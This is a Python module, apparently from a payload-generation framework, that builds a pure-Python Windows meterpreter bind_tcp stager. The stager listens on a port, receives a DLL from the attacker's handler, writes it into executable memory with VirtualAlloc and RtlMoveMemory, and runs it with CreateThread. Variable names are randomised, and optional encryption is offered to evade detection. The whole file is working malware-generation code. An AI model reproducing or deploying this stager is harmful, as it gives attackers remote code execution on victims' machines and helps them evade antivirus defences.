"""

Custom-written pure python meterpreter/bind_tcp stager.

"""

from modules.common import helpers
from modules.common import encryption
from modules.common.pythonpayload import PythonPayload

class Payload(PythonPayload):
    
    def __init__(self):
        PythonPayload.__init__(self)
        # required options
        self.description = "pure windows/meterpreter/bind_tcp stager, no shellcode"
        self.rating = "Excellent"
        
        # optional
        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options["RHOST"] = ["", "The listen target address"]
        self.required_options["LPORT"] = ["4444", "The listen port"]
        
        
    def generate(self):
        self._validateArchitecture()
        
        # randomize all of the variable names used
        shellCodeName = helpers.randomString()
        socketName = helpers.randomString()
        clientSocketName = helpers.randomString()
        intervalName = helpers.randomString()
        attemptsName = helpers.randomString()
        getDataMethodName = helpers.randomString()
        fdBufName = helpers.randomString()
        rcvStringName = helpers.randomString()
        rcvCStringName = helpers.randomString()

        injectMethodName = helpers.randomString()
        tempShellcodeName = helpers.randomString()
        shellcodeBufName = helpers.randomString()
        fpName = helpers.randomString()
        tempCBuffer = helpers.randomString()
        
        
        payloadCode = "import struct, socket, binascii, ctypes, random, time\n"

        # socket and shellcode variables that need to be kept global
        payloadCode += "%s, %s = None, None\n" % (shellCodeName,socketName)

        # build the method that creates a socket, connects to the handler,
        # and downloads/patches the meterpreter .dll
        payloadCode += "def %s():\n" %(getDataMethodName)
        payloadCode += "\ttry:\n"
        payloadCode += "\t\tglobal %s\n" %(socketName)
        payloadCode += "\t\tglobal %s\n" %(clientSocketName)
        # build the socket and connect to the handler
        payloadCode += "\t\t%s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n" %(socketName)
        payloadCode += "\t\t%s.bind(('%s', %s))\n" %(socketName,self.required_options["RHOST"][0],self.required_options["LPORT"][0])
        payloadCode += "\t\t%s.listen(1)\n" % (socketName)
        payloadCode += "\t\t%s,_ = %s.accept()\n" % (clientSocketName, socketName)
        # pack the underlying socket file descriptor into a c structure
        payloadCode += "\t\t%s = struct.pack('<i', %s.fileno())\n" % (fdBufName,clientSocketName)
        # unpack the length of the payload, received as a 4 byte array from the handler
        payloadCode += "\t\tl = struct.unpack('<i', str(%s.recv(4)))[0]\n" %(clientSocketName)
        payloadCode += "\t\t%s = \"     \"\n" % (rcvStringName)
        # receive ALL of the payload .dll data
        payloadCode += "\t\twhile len(%s) < l: %s += %s.recv(l)\n" % (rcvStringName, rcvStringName, clientSocketName)
        payloadCode += "\t\t%s = ctypes.create_string_buffer(%s, len(%s))\n" % (rcvCStringName,rcvStringName,rcvStringName)
        # prepend a little assembly magic to push the socket fd into the edi register
        payloadCode += "\t\t%s[0] = binascii.unhexlify('BF')\n" %(rcvCStringName)
        # copy the socket fd in
        payloadCode += "\t\tfor i in xrange(4): %s[i+1] = %s[i]\n" % (rcvCStringName, fdBufName)
        payloadCode += "\t\treturn %s\n" % (rcvCStringName)
        payloadCode += "\texcept: return None\n"

        # build the method that injects the .dll into memory
        payloadCode += "def %s(%s):\n" %(injectMethodName,tempShellcodeName)
        payloadCode += "\tif %s != None:\n" %(tempShellcodeName)
        payloadCode += "\t\t%s = bytearray(%s)\n" %(shellcodeBufName,tempShellcodeName)
        # allocate enough virtual memory to stuff the .dll in
        payloadCode += "\t\t%s = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(%s)),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n" %(fpName,shellcodeBufName)
        # virtual lock to prevent the memory from paging out to disk
        payloadCode += "\t\tctypes.windll.kernel32.VirtualLock(ctypes.c_int(%s), ctypes.c_int(len(%s)))\n" %(fpName,shellcodeBufName)
        payloadCode += "\t\t%s = (ctypes.c_char * len(%s)).from_buffer(%s)\n" %(tempCBuffer,shellcodeBufName,shellcodeBufName)
        # copy the .dll into the allocated memory
        payloadCode += "\t\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(%s), %s, ctypes.c_int(len(%s)))\n" %(fpName,tempCBuffer,shellcodeBufName)
        # kick the thread off to execute the .dll
        payloadCode += "\t\tht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(%s),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n" %(fpName)
        # wait for the .dll execution to finish
        payloadCode += "\t\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))\n"

        # download the stager
        payloadCode += "%s = %s()\n" %(shellCodeName, getDataMethodName)
        # inject what we grabbed
        payloadCode += "%s(%s)\n" % (injectMethodName,shellCodeName)

        if self.required_options["use_pyherion"][0].lower() == "y":
            payloadCode = encryption.pyherion(payloadCode)

        return payloadCode

